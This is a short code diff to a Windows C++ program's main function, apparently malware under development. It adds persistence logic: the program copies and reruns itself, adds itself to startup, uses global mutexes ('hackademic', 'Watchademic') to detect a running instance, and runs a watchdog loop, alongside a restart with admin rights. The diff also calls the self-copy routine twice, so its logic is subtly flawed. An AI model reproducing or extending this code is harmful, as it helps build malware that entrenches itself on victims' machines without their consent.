@@ -16,8 +16,22 @@ int main(int argc, char* argv[]) {
         persistence::restartAsAdmin();
         return 0;
     }
-    Sleep(rand() % 5000 + 5000);
-    if (persistence::copyAndRunSelf()) {
+    Sleep(5000);
+    if (persistence::copyAndRunSelf() != 0) {
+        if (persistence::copyAndRunSelf() == 2){
+            persistence::addToStartup();
+            HANDLE hWatchdogMutex = CreateMutexA(NULL, FALSE, "Global\\Watchademic");
+            if (GetLastError() == ERROR_ALREADY_EXISTS) {
+                std::cout << "Already working!" << std::endl;
+                return 0;
+            }
+            persistence::watchdogLoop();
+        }
+        return 0;
+    }
+    HANDLE hHackademicMutex = CreateMutexA(NULL, FALSE, "Global\\hackademic");
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        std::cout << "Already working!" << std::endl;
         return 0;
     }
     if (!persistence::checkAndCreateFile("lafkildatnn.dat")) {
